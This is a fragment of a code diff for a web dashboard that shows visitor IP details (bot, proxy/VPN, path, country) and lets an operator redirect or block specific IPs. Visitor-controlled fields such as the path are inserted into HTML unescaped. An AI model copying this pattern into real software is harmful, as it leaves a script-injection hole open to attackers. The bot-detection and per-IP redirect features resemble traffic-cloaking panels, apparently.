+                   html += `<tr><td>Blocked:</td><td>${data.isBlocked ? '<span class="badge bg-danger">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
+                   html += `<tr><td>Bot:</td><td>${data.isBot ? '<span class="badge bg-info">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
+                   html += `<tr><td>Proxy/VPN:</td><td>${data.proxy || data.hosting ? '<span class="badge bg-warning">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
+                   html += `<tr><td>Current Path:</td><td>${data.lastPath || '/'}</td></tr>`;
+                   html += `<tr><td>Request Count:</td><td>${data.requestCount || 0}</td></tr>`;
+                   html += '</table>';
+                   html += '</div>';
                   
                   // Right column - Location & Device
                   html += '<div class="col-md-6">';
                   html += '<h5>Location & Device</h5>';
                   html += '<table class="table table-sm">';
                   if (data.countryCode) {
-                      html += `<tr><td>Country:</td><td><img src="https://flagcdn.com/w20/${data.countryCode.toLowerCase()}.png" class="me-1">${data.country || data.countryCode}</td></tr>`;
+                      html += `<tr><td>Country:</td><td><img src="https://flagcdn.com/w40/${data.countryCode.toLowerCase()}" class="me-1">${data.country || data.countryCode}</td></tr>`;
                   } else {
                       html += '<tr><td>Country:</td><td>Unknown</td></tr>';
                   }
@@ -1678,11 +1922,51 @@ function updateBlockedCountries(countries) {
                   
                   // Update modal content
                   $('#ipDetailsModalBody').html(html);
-              }).fail(function() {
-                  $('#ipDetailsModalBody').html('<div class="alert alert-danger">Failed to load IP details</div>');
-              });
-          }
-      });
+               }).fail(function() {
+                   $('#ipDetailsModalBody').html('<div class="alert alert-danger">Failed to load IP details</div>');
+               });
+            } // Added closing bracket here
+            
+            // Add event handler for the redirect button
+            $('#modalRedirectBtn').on('click', function() {
+                const ip = $('#modalRedirectIpInput').val();
+                const redirectUrl = $('#modalRedirectUrlInput').val();
+                
+                if (!ip || !redirectUrl) {
+                    showToast('Please provide both IP and redirect URL', 'warning');
+                    return;
+                }
+                
+                // Send redirect request to server
+                $.ajax({
+                    url: '/dashboard/redirect-ip',
+                    method: 'POST',
+                    data: { ip: ip, redirectUrl: redirectUrl },
+                    success: function(response) {
+                        $('#redirectModal').modal('hide');
+                        showToast('Redirect set successfully', 'success');
+                        // Refresh dashboard data
+                        updateDashboard();
+                    },
+                    error: function() {
+                        showToast('Failed to set redirect', 'danger');
+                    }
+                });
+            });
+            
+            // Function to set redirect IP
+            function setRedirectIp(ip) {
+                $('#modalRedirectIpInput').val(ip);
+                $('#modalRedirectUrlInput').val('');
+                $('#redirectModal').modal('show');
+            }
+            
+            // Listen for dashboard update events from server
+            socket.on('dashboard-update', function() {
+                console.log('Received dashboard-update event');
+                updateDashboard();
+            });
+        });
     });
     </script>
     
@@ -1725,6 +2009,33 @@ function updateBlockedCountries(countries) {
           <div class="modal-footer">
             <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
             <button type="button" class="btn btn-primary" id="modalRedirectBtn">Redirect</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Block IP Modal -->
+    <div class="modal fade" id="blockIpModal" tabindex="-1" aria-labelledby="blockIpModalLabel" aria-hidden="true">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="blockIpModalLabel">Block IP Address</h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+          </div>
+          <div class="modal-body">
+            <div class="mb-3">
+              <label for="modalBlockIpInput" class="form-label">IP Address</label>
+              <input type="text" class="form-control" id="modalBlockIpInput" readonly>
+            </div>
+            <div class="mb-3">
+              <label for="modalBlockRedirectUrlInput" class="form-label">Redirect URL</label>
+              <input type="text" class="form-control" id="modalBlockRedirectUrlInput" placeholder="https://example.com">
+              <div class="form-text">Blocked visitors will be redirected to this URL</div>
+            </div>
+          </div>
+          <div class="modal-footer">
+            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+            <button type="button" class="btn btn-danger" onclick="submitBlockIp()">Block IP</button>
           </div>
         </div>
       </div>
